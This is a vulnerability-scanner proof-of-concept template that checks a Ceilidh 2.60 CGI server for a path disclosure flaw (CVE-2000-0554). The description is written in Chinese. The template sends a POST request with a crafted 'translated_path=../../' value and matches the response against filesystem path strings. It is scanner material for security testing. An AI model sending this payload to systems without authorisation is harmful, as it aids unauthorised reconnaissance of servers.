[info]
author = "AVE"
description = "通过向 Ceilidh 发送包含特制 translated_path 字段的 POST 请求，检测服务器是否泄露文件系统真实路径"
id = "POC-AVE-2000-0641"
name = "Lilikoi Ceilidh 2.60 Path Disclosure PoC"
severity = "medium"
tags = ["ave-2000-0641"]
vuln_id = [
    "CVE-2000-0554",
    "AVE-2000-0641",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/ceilidh.cgi"
protocol = "http"

[poc.requests.body]
content = "translated_path=../../"
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "/usr",
    "/var",
    'C:\',
    'D:\',
    "www",
    "htdocs",
    "ceilidh",
]
